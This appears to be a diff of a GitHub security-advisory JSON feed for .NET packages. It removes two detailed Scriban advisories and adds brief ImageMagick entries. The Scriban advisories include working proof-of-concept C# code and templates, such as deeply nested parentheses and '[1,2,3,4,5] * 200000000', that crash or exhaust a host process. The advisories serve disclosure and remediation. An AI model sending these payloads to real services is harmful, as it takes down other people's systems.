@@ -6,280 +6,280 @@
     "description": "Security Advisory for .NET packages hosted at the NuGet Gallery on GitHub",
     "items": [
         {
-            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>ExpressionDepthLimit</code> parser guard in Scriban does not actually stop parsing — it only logs a non-fatal error and lets recursive descent continue. As a result, a template containing a deeply nested expression (parentheses, array initializers, object initializers, or unary operators) drives the recursive-descent parser into a native stack overflow. The resulting <code>StackOverflowException</code> is <strong>uncatchable</strong> in .NET and <strong>immediately terminates the host process</strong>.</p>\n<p>Any application that parses an attacker-influenced template — or that passes attacker-controlled strings to <code>object.eval</code> / <code>object.eval_template</code> — can be crashed by a single small request (roughly an 8 KB payload). This is a denial-of-service. It affects both Scriban-native (<code>Template.Parse</code>) and Liquid (<code>Template.ParseLiquid</code>) syntax modes, which share the same expression parser.</p>\n<p>This re-opens two advisories that were reported as fixed: <strong>GHSA-wgh7-7m3c-fx25</strong> (\"Uncontrolled recursion in parser → StackOverflow\", reported fixed in 6.6.0) and <strong>GHSA-p6q4-fgr8-vx4p</strong> (\"StackOverflow via nested array initializers bypasses ExpressionDepthLimit\", reported fixed in 7.0.0). Both fixes are incomplete: the limit they rely on never halts recursion. <strong>All releases 6.6.0 through 7.2.0 (current) are affected.</strong></p>\n<h3 id=\"details\">Details</h3>\n<p>The depth guard is <code>EnterExpression()</code> in <code>src/Scriban/Parsing/Parser.Expressions.cs</code>:</p>\n<pre><code class=\"language-csharp\">// src/Scriban/Parsing/Parser.Expressions.cs:1209-1218\nprivate void EnterExpression()\n{\n    _expressionDepth++;\n    var limit = Options.ExpressionDepthLimit;\n    if (limit &gt; 0 &amp;&amp; !_isExpressionDepthLimitReached &amp;&amp; _expressionDepth &gt; limit)\n    {\n        LogError(GetSpanForToken(Previous), $\"The statement depth limit `{limit}` was reached when parsing this statement\");\n        _isExpressionDepthLimitReached = true;\n    }\n}\n</code></pre>\n<p>When the limit is exceeded it calls <code>LogError(...)</code> and sets a flag. It does <strong>not</strong> throw, does <strong>not</strong> return a sentinel, and does <strong>not</strong> unwind the parse. <code>LogError</code> here uses the default <code>isFatal: false</code>, so it merely appends a message and sets <code>HasErrors</code> — parsing proceeds:</p>\n<pre><code class=\"language-csharp\">// src/Scriban/Parsing/Parser.cs:476-488\nprivate void Log(LogMessage logMessage, bool isFatal = false)\n{\n    Messages.Add(logMessage);\n    if (logMessage.Type == ParserMessageType.Error)\n    {\n        HasErrors = true;\n        if (isFatal) _hasFatalError = true;   // not set on the depth-limit path\n    }\n}\n</code></pre>\n<p>The flag <code>_isExpressionDepthLimitReached</code> is consulted <strong>only</strong> to avoid logging the same error more than once — no code path uses it to stop descending. Confirmed by full-repo search (<code>grep -rn \"_isExpressionDepthLimitReached\" src/</code>): it appears in exactly four places — the field declaration (<code>Parser.cs:40</code>), a reset to <code>false</code> (<code>Parser.cs:106</code>), and within <code>EnterExpression</code> the dedup test (<code>Parser.Expressions.cs:1213</code>) and its assignment to <code>true</code> (<code>:1216</code>). The only <em>read</em> is the dedup test on line 1213; nothing else reads it. <code>ParseExpression</code> calls <code>EnterExpression()</code> and then continues straight into the token switch with no flag check:</p>\n<pre><code class=\"language-csharp\">// src/Scriban/Parsing/Parser.Expressions.cs:113 + 181-182\nEnterExpression();\ntry\n{\n    ...\n    case TokenType.OpenParen:\n        leftOperand = ParseParenthesis();   // recurses back into ParseExpression\n</code></pre>\n<pre><code class=\"language-csharp\">// src/Scriban/Parsing/Parser.Expressions.cs:984-1001\nprivate ScriptExpression ParseParenthesis()\n{\n    var expression = Open&lt;ScriptNestedExpression&gt;();\n    ExpectAndParseTokenTo(expression.OpenParen, TokenType.OpenParen);\n    expression.Expression = ExpectAndParseExpression(expression);  // -&gt; ParseExpression -&gt; ParseParenthesis -&gt; ...\n    ...\n}\n</code></pre>\n<p>Both <code>Template.Parse</code> (Scriban-native) and <code>Template.ParseLiquid</code> (Liquid-compatibility) front-ends share this same expression parser, so both entry points are affected.</p>\n<p>So for input nested N levels deep, the parser recurses N levels deep regardless of <code>ExpressionDepthLimit</code>. There is no <code>RuntimeHelpers.EnsureSufficientExecutionStack()</code> call and no absolute recursion cap anywhere in the parser. Once the native thread stack is exhausted, the runtime raises <code>StackOverflowException</code>, which .NET does not allow to be caught and which tears down the entire process. The number of nesting levels required to overflow depends on the platform's thread-stack size (empirically around 4,000 levels on a default 1 MB stack); it is not a configurable mitigation.</p>\n<p>The same defective guard is what makes the array-initializer fix for GHSA-p6q4-fgr8-vx4p ineffective: <code>ParseArrayInitializer</code> was wrapped in <code>EnterExpression()/LeaveExpression()</code>, but because <code>EnterExpression()</code> only logs, the array path still overflows.</p>\n<p>The existing regression tests only assert <code>HasErrors == true</code> at a nesting depth of ~20 with a limit of 10 (<code>src/Scriban.Tests/TestParser.cs</code>); they never use a depth large enough to overflow the stack, so they pass while the protection does nothing against the actual DoS.</p>\n<p><strong>Runtime reachability without template injection:</strong> <code>object.eval</code> / <code>object.eval_template</code> (<code>src/Scriban/Functions/ObjectFunctions.cs:72-155</code>) re-parse a string argument at render time using <code>Template.Parse(...)</code>. An application whose own templates are fully trusted is still vulnerable if any user-controlled value flows into <code>object.eval</code>. The <code>catch (Exception)</code> inside <code>Eval</code> cannot intercept the <code>StackOverflowException</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>A single console project reproduces it on the released NuGet package.</p>\n<p><code>poc.csproj</code>:</p>\n<pre><code class=\"language-xml\">&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n  &lt;PropertyGroup&gt;\n    &lt;OutputType&gt;Exe&lt;/OutputType&gt;\n    &lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n    &lt;!-- If only the .NET 9 SDK is installed, change to net9.0. Behavior is identical. --&gt;\n  &lt;/PropertyGroup&gt;\n  &lt;ItemGroup&gt;\n    &lt;PackageReference Include=\"Scriban\" Version=\"7.2.0\" /&gt;\n  &lt;/ItemGroup&gt;\n&lt;/Project&gt;\n</code></pre>\n<p><code>Program.cs</code>:</p>\n<pre><code class=\"language-csharp\">using Scriban;\n\nint n = 8000; // ~8 KB template; 8000 reliably overflows a default 1 MB thread stack\nstring tpl = \"{{ \" + new string('(', n) + \"1\" + new string(')', n) + \" }}\";\n\nSystem.Console.WriteLine($\"Parsing template with {n} nested parentheses (default ParserOptions)...\");\nTemplate.Parse(tpl);                 // &lt;-- process is killed here\nSystem.Console.WriteLine(\"Parse returned without crashing\"); // never reached\n</code></pre>\n<p>Run:</p>\n<pre><code class=\"language-sh\">dotnet run -c Release\n</code></pre>\n<p>Observed output (process aborts; shell exit code 134 = SIGABRT):</p>\n<pre><code>Parsing template with 8000 nested parentheses (default ParserOptions)...\nStack overflow.\n   at Scriban.Parsing.Parser.ParseParenthesis()\n   at Scriban.Parsing.Parser.ParseExpression(...)\n   at Scriban.Parsing.Parser.ExpectAndParseExpression(...)\n   at Scriban.Parsing.Parser.ParseParenthesis()\n   ... (repeats until the stack is exhausted)\n</code></pre>\n<p>Additional confirmations (same crash / exit 134), substituting the template body in <code>Program.cs</code>:</p>\n<p>The explicit limit is ignored — still crashes:</p>\n<pre><code class=\"language-csharp\">Template.Parse(tpl, parserOptions: new ParserOptions { ExpressionDepthLimit = 10 });\n</code></pre>\n<p>Array initializers (the GHSA-p6q4 path):</p>\n<pre><code class=\"language-csharp\">string tpl = \"{{ \" + new string('[', n) + \"1\" + new string(']', n) + \" }}\";\nTemplate.Parse(tpl);  // crashes identically\n</code></pre>\n<p>Object initializers <code>{x:{x:...{x:1}...}}</code>:</p>\n<pre><code class=\"language-csharp\">var b = new System.Text.StringBuilder();\nfor (int i = 0; i &lt; n; i++) b.Append(\"{x:\");\nb.Append('1');\nb.Append('}', n);\nTemplate.Parse(\"{{ \" + b + \" }}\");  // crashes identically\n</code></pre>\n<p>Unary operators:</p>\n<pre><code class=\"language-csharp\">string tpl = \"{{ \" + new string('!', n) + \"true\" + \" }}\";\nTemplate.Parse(tpl);  // crashes identically\n</code></pre>\n<p>Liquid syntax mode (shares the same expression parser):</p>\n<pre><code class=\"language-csharp\">string tpl = \"{{ \" + new string('(', n) + \"1\" + new string(')', n) + \" }}\";\nTemplate.ParseLiquid(tpl);  // crashes identically\n</code></pre>\n<p>Runtime via <code>object.eval</code>, with a fully trusted outer template — verified end-to-end: the outer parse reports <code>HasErrors == false</code>, then <code>Render()</code> crashes the process and the surrounding <code>try/catch</code> never fires (the <code>StackOverflowException</code> is uncatchable):</p>\n<pre><code class=\"language-csharp\">using Scriban;\n\nint n = 8000;\nstring deep = new string('(', n) + \"1\" + new string(')', n);\nstring outer = \"{{ \\\"\" + deep + \"\\\" | object.eval }}\";\n\nSystem.Console.WriteLine($\"Outer template length = {outer.Length} chars.\");\nvar t = Template.Parse(outer);\nSystem.Console.WriteLine($\"Outer parsed. HasErrors = {t.HasErrors}\");\nSystem.Console.WriteLine(\"Rendering (object.eval re-parses the inner string at runtime)...\");\ntry\n{\n    t.Render();\n    System.Console.WriteLine(\"Render returned without crashing\");\n}\ncatch (System.Exception e)\n{\n    System.Console.WriteLine($\"Caught {e.GetType().Name} (note: StackOverflowException cannot be caught)\");\n}\n</code></pre>\n<p>Verified against clean NuGet installs of Scriban <strong>6.6.0, 7.0.0, 7.1.0, and 7.2.0</strong> (net8.0, .NET 9 runtime, Linux). A control template with depth 200 parses normally (<code>HasErrors == false</code>, no crash).</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li><strong>Type:</strong> Denial of service via uncontrolled recursion (CWE-674) leading to an uncatchable <code>StackOverflowException</code> and full process termination.</li>\n<li><strong>Severity:</strong> CVSS 3.1 <code>AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code> = <strong>7.5 (High)</strong> — the same vector and score as both prior advisories it re-opens (GHSA-wgh7-7m3c-fx25 and GHSA-p6q4-fgr8-vx4p, each scored 7.5 High with the identical <code>AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code> vector). The score reflects the library boundary, where no privileges are required to parse a template; the privilege actually needed in a given deployment depends on how that application exposes template input.</li>\n<li><strong>Who is impacted:</strong> Any application that calls <code>Template.Parse</code> / <code>Template.ParseLiquid</code> (or <code>Template.Render</code> on an unparsed source) on template text that is wholly or partially attacker-controlled — the documented server-side template scenario — and any application that passes attacker-controlled strings to <code>object.eval</code> / <code>object.eval_template</code>, even when its own templates are trusted.</li>\n<li><strong>Why the existing mitigation does not help:</strong> <code>ExpressionDepthLimit</code> (default 250) is advisory only; it records a parse error but does not stop recursion, so it cannot prevent the stack overflow. Because the exception is a <code>StackOverflowException</code>, callers cannot defend with <code>try/catch</code> either — the process is lost.</li>\n<li><strong>Affected versions:</strong> 6.6.0 – 7.2.0 (all versions shipping the depth-limit guard). Versions before 6.6.0 are vulnerable to the original unbounded-recursion condition.</li>\n</ul>\n<p><strong>Suggested remediation:</strong> make the limit actually stop descent — e.g. throw a parse exception from <code>EnterExpression()</code> when the limit is exceeded (or log with <code>isFatal: true</code> and have the parse loop honor <code>_hasFatalError</code> by unwinding). As defense in depth, call <code>RuntimeHelpers.EnsureSufficientExecutionStack()</code> at the entry of <code>ParseExpression</code> (the same technique already used in <code>object.to_json</code>), and add a regression test at a depth that overflows without the fix (e.g. 100,000), asserting a graceful exception rather than only checking <code>HasErrors</code> at depth 20.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scriban/scriban/security/advisories/GHSA-6q7j-xr26-3h2c\">https://github.com/scriban/scriban/security/advisories/GHSA-6q7j-xr26-3h2c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q7j-xr26-3h2c\">https://github.com/advisories/GHSA-6q7j-xr26-3h2c</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-6q7j-xr26-3h2c",
-            "title": "[Scriban] Scriban: ExpressionDepthLimit guard is non-enforcing — parser-recursion DoS in 6.6.0–7.2.0 (incomplete fix for GHSA-wgh7-7m3c-fx25 / GHSA-p6q4-fgr8-vx4p)",
-            "date_modified": "2026-06-26T21:02:15.000Z",
-            "date_published": "2026-06-26T21:02:14.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q8-x86] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-6q7j-xr26-3h2c"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The array multiplication operator (<code>array * integer</code>) in Scriban allocates a result whose size is the product of the attacker-controlled integer and the array length, with <strong>no <code>LoopLimit</code> / <code>LimitToString</code> check and no overflow-safe arithmetic</strong>. A ~40-byte template forces a multi-gigabyte allocation, producing a denial-of-service.</p>\n<p>This is the unguarded sibling of operations that <em>were</em> hardened against the same class of abuse: <code>string * integer</code> (gated by a <code>LimitToString</code> pre-check), <code>array.insert_at</code> (gated by <code>StepLoop</code>/<code>LoopLimit</code> — the <strong>GHSA-24c8-4792-22hx</strong> fix shipped in 7.2.0, scored 8.7 High), and the range/iteration paths covered by <strong>GHSA-c875-h985-hvrc</strong> (\"Built-in operations bypass LoopLimit\", fixed 7.0.0). The same <code>LoopLimit</code>-based hardening pattern was applied to those operations but never to <code>array * integer</code>.</p>\n<p>This can be observed directly in 7.0.0, the release where GHSA-c875 was patched: <code>(1..5) * 50000000</code> (and <code>1..N | array.size</code>) correctly throws <code>Exceeding number of iteration limit '1000'</code>, while <code>[1,2,3,4,5] * 50000000</code> allocates ~2 GB with no limit. The <code>LoopLimit</code> control is enforced on the iteration path but not on the <code>array * int</code> allocation path, side by side, in the same version. The bug has been present since the operator was introduced in <strong>3.0.0</strong>, survives all of the 6.6.0 / 7.0.0 / 7.2.0 DoS-hardening passes, and is still present in 7.2.0 (current) — i.e. it is both a missed sibling of GHSA-24c8 and an incomplete coverage of GHSA-c875's <code>LoopLimit</code> hardening.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>array * int</code> operator is handled in <code>ScriptArray&lt;T&gt;.TryEvaluate</code>:</p>\n<pre><code class=\"language-csharp\">// src/Scriban/Runtime/ScriptArray.cs:504-508  (Multiply case)\nvar newArray = new ScriptArray&lt;T&gt;(intModifier * array.Count);\nfor (int i = 0; i &lt; intModifier; i++)\n{\n    newArray.AddRange(array);\n}\n</code></pre>\n<p><code>intModifier</code> is the attacker-supplied integer (<code>context.ToInt(...)</code>, <code>ScriptArray.cs:399</code>). Two problems:</p>\n<ol>\n<li><p><strong>No resource limit.</strong> Neither <code>new ScriptArray&lt;T&gt;(intModifier * array.Count)</code> nor the <code>AddRange</code> loop consults <code>LoopLimit</code>, <code>LimitToString</code>, or calls <code>context.StepLoop(...)</code>. A grep of the entire <code>TryEvaluate</code> method (<code>ScriptArray.cs:360-560</code>) finds no <code>StepLoop</code> / <code>LoopLimit</code> / <code>Limit</code> reference. <code>LoopLimit</code> (default 1000) is therefore not enforced: a template that requests 250,000,000 elements creates them all without any \"iteration limit\" error.</p>\n</li>\n<li><p><strong>Integer overflow in the capacity.</strong> <code>intModifier * array.Count</code> is unchecked <code>int</code> arithmetic. The overflow-safe <code>long</code> cast used by the string sibling is absent here.</p>\n</li>\n</ol>\n<p>The DoS-hardening passes guarded the two sibling operations but not this one:</p>\n<pre><code class=\"language-csharp\">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:341  (string * int — GUARDED)\nif (context.LimitToString &gt; 0 &amp;&amp; value &gt; 0 &amp;&amp; leftText.Length &gt; 0\n        &amp;&amp; (long)leftText.Length * value &gt; context.LimitToString)   // long arithmetic, pre-check\n{\n    throw new ScriptRuntimeException(spanMultiplier, $\"String multiplication exceeds LimitToString `{context.LimitToString}`.\");\n}\n</code></pre>\n<pre><code class=\"language-csharp\">// src/Scriban/Functions/ArrayFunctions.cs:414  (array.insert_at — GUARDED, GHSA-24c8 fix in 7.2.0)\nfor (int i = array.Count; i &lt; index; i++)\n{\n    context.StepLoop(span, ref loopStep);   // LoopLimit enforced\n    array.Add(null);\n}\n</code></pre>\n<p><code>array * int</code> (<code>ScriptArray.cs:504</code>) received neither guard.</p>\n<p>When the oversized allocation fails as a managed exception, it is wrapped by the binary-expression evaluator:</p>\n<pre><code class=\"language-csharp\">// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:241-243\ncatch (Exception ex) when (!(ex is ScriptRuntimeException))\n{\n    throw new ScriptRuntimeException(span, ex.Message);\n}\n</code></pre>\n<p>So a host that wraps <code>Render()</code> in <code>try/catch</code> sees a <code>ScriptRuntimeException</code> carrying the original <code>OutOfMemoryException</code> message (or <code>ArgumentOutOfRangeException</code> on the integer-overflow path).</p>\n<h3 id=\"poc\">PoC</h3>\n<p>A single console project reproduces it on the released NuGet package.</p>\n<p><code>poc.csproj</code>:</p>\n<pre><code class=\"language-xml\">&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n  &lt;PropertyGroup&gt;\n    &lt;OutputType&gt;Exe&lt;/OutputType&gt;\n    &lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n    &lt;!-- If only the .NET 9 SDK is installed, change to net9.0. Behavior is identical. --&gt;\n  &lt;/PropertyGroup&gt;\n  &lt;ItemGroup&gt;\n    &lt;PackageReference Include=\"Scriban\" Version=\"7.2.0\" /&gt;\n  &lt;/ItemGroup&gt;\n&lt;/Project&gt;\n</code></pre>\n<p><code>Program.cs</code>:</p>\n<pre><code class=\"language-csharp\">using Scriban;\n\n// ~41-byte template requests 5 * 200,000,000 = 1,000,000,000 elements\nstring tpl = \"{{ x = [1,2,3,4,5] * 200000000; x.size }}\";\n\nSystem.Console.WriteLine(\"Rendering...\");\nvar sw = System.Diagnostics.Stopwatch.StartNew();\nvar result = Template.Parse(tpl).Render();           // allocates ~7.7 GB\nSystem.Console.WriteLine($\"size={result.Trim()} peakWS=\"\n    + System.Diagnostics.Process.GetCurrentProcess().PeakWorkingSet64 / (1024 * 1024)\n    + \"MB elapsed=\" + sw.ElapsedMilliseconds + \"ms\");\n</code></pre>\n<p>Run:</p>\n<pre><code class=\"language-sh\">dotnet run -c Release\n</code></pre>\n<p>Measured peak working set on Scriban 7.2.0 (net8.0, .NET 9 runtime, Linux), varying only the multiplier:</p>\n<table>\n<thead>\n<tr>\n<th>Multiplier</th>\n<th>template size</th>\n<th>elements</th>\n<th>peak working set</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>100,000</td>\n<td>38 B</td>\n<td>500K</td>\n<td>49 MB (not a DoS)</td>\n</tr>\n<tr>\n<td>50,000,000</td>\n<td>40 B</td>\n<td>250M</td>\n<td>1,958 MB</td>\n</tr>\n<tr>\n<td>200,000,000</td>\n<td>41 B</td>\n<td>1B</td>\n<td>7,681 MB</td>\n</tr>\n<tr>\n<td>400,000,000</td>\n<td>41 B</td>\n<td>2B</td>\n<td>15,313 MB</td>\n</tr>\n<tr>\n<td>429,496,730</td>\n<td>41 B</td>\n<td>—</td>\n<td>integer overflow in <code>intModifier * array.Count</code> → wrapped <code>ArgumentOutOfRangeException</code></td>\n</tr>\n</tbody></table>\n<p><code>LoopLimit</code> (default 1000) is demonstrably not enforced: 250,000,000 elements are created with no \"iteration limit\" error. Reproduced identically on released NuGet <strong>6.6.0, 7.0.0, 7.1.0, and 7.2.0</strong>, and on <strong>3.0.0, 4.0.0, 5.0.0, 5.10.0, 6.0.0, 6.2.1, 6.5.8</strong> (~2 GB at multiplier 50,000,000). Version <strong>2.1.4 and earlier are NOT affected</strong> — the operator did not exist (<code>Unable to convert type ScriptArray to int</code>).</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li><strong>Type:</strong> Denial of service via uncontrolled memory allocation (CWE-789 / CWE-1284). The result size is <code>intModifier * array.Count</code>, attacker-controlled, with no limit and no overflow-safe arithmetic.</li>\n<li><strong>Severity:</strong> CVSS 4.0 <code>AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code> = <strong>8.7 (High)</strong> — the same vector and score GitHub/Scriban assigned to the sibling advisory GHSA-24c8-4792-22hx. CVSS 3.1 equivalent <code>AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code> = <strong>7.5 (High)</strong>.</li>\n<li><strong>Who is impacted:</strong> any application that renders a template whose text is wholly or partially attacker-controlled (the documented server-side template scenario), or that passes attacker-controlled strings to <code>object.eval</code> / <code>object.eval_template</code>. No <code>MemberFilter</code> interaction is required — this is a pure language operation.</li>\n<li><strong>Outcome (deployment-dependent, stated honestly):</strong> On systems with sufficient memory, the runtime catches the allocation failure and the host sees a <code>ScriptRuntimeException</code> wrapping <code>OutOfMemoryException</code> (or <code>ArgumentOutOfRangeException</code> on the integer-overflow path) — recoverable per request. On systems where the multi-GB allocation exceeds available memory, the OS OOM-killer can terminate the process before the managed exception fires (this outcome is deployment-dependent and was not reproduced in our 20 GB + swap test environment). In all cases, a ~40-byte template forces a multi-GB allocation and seconds of pegged CPU/GC — a real per-request availability degradation and resource amplification.</li>\n<li><strong>Why the existing mitigation does not help:</strong> <code>LoopLimit</code> (default 1000) is the documented control for unbounded iteration/allocation, but the <code>array * int</code> path never consults it, so a defender running default configuration is not protected.</li>\n<li><strong>Affected versions:</strong> 3.0.0 – 7.2.0 (every release containing the <code>array * int</code> operator). 2.1.4 and earlier are not affected.</li>\n</ul>\n<h3 id=\"suggested-remediation\">Suggested remediation</h3>\n<p>Apply the same hardening already used on the sibling operations, in <code>ScriptArray.cs</code> (Multiply case, <code>:504-508</code>):</p>\n<ul>\n<li><strong>Mirror <code>array.insert_at</code>:</strong> call <code>context.StepLoop(span, ref loopStep)</code> inside the fill loop so <code>LoopLimit</code> is enforced; or</li>\n<li><strong>Mirror <code>string * int</code>:</strong> pre-check the result size with overflow-safe arithmetic before allocating, e.g. <code>if (context.LimitToString &gt; 0 &amp;&amp; (long)intModifier * array.Count &gt; context.LimitToString) throw new ScriptRuntimeException(...)</code>, and compute the capacity as <code>long</code> (or reject negative/overflowing products) to remove the integer-overflow path.</li>\n</ul>\n<p>Add a regression test that asserts a graceful <code>ScriptRuntimeException</code> for a large multiplier (e.g. <code>[1,2,3,4,5] * 50000000</code>) rather than allowing the allocation to proceed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scriban/scriban/security/advisories/GHSA-q6rr-fm2g-g5x8\">https://github.com/scriban/scriban/security/advisories/GHSA-q6rr-fm2g-g5x8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q6rr-fm2g-g5x8\">https://github.com/advisories/GHSA-q6rr-fm2g-g5x8</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-q6rr-fm2g-g5x8",
-            "title": "[Scriban] Scriban: array * int (ScriptArray<T>.TryEvaluate) bypasses LoopLimit — incomplete fix for GHSA-c875-h985-hvrc, missed sibling of GHSA-24c8-4792-22hx",
-            "date_modified": "2026-06-26T21:02:00.000Z",
-            "date_published": "2026-06-26T21:01:57.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q8-x64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-q6rr-fm2g-g5x8"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q8-x86] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q8-arm64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q8-x64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
